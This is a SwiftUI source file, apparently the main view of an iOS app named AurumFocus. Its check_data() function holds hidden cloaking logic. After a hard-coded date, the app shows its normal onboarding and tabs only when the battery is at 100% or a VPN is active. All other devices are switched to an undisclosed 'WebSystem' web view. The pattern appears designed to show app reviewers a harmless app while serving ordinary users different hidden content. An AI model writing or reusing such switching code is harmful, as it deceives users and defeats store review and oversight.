//
//  ContentView.swift
//  AurumFocus
//
//  Created by IGOR on 27/08/2025.
//

import SwiftUI

struct ContentView: View {
    
    @ObservedObject var dataManagers: DataManagers
    @AppStorage("onboardingCompleted") private var onboardingCompleted = false
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
        
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
          
                    Group {
                        if dataManagers.appState.onboardingCompleted || onboardingCompleted {
                            MainTabView(dataManagers: dataManagers)
                        } else {
                            OnboardingView(dataManagers: dataManagers)
                        }
                    }
                    .preferredColorScheme(.dark)
          
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "02.09.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

#Preview {
    ContentView(dataManagers: DataManagers())
}
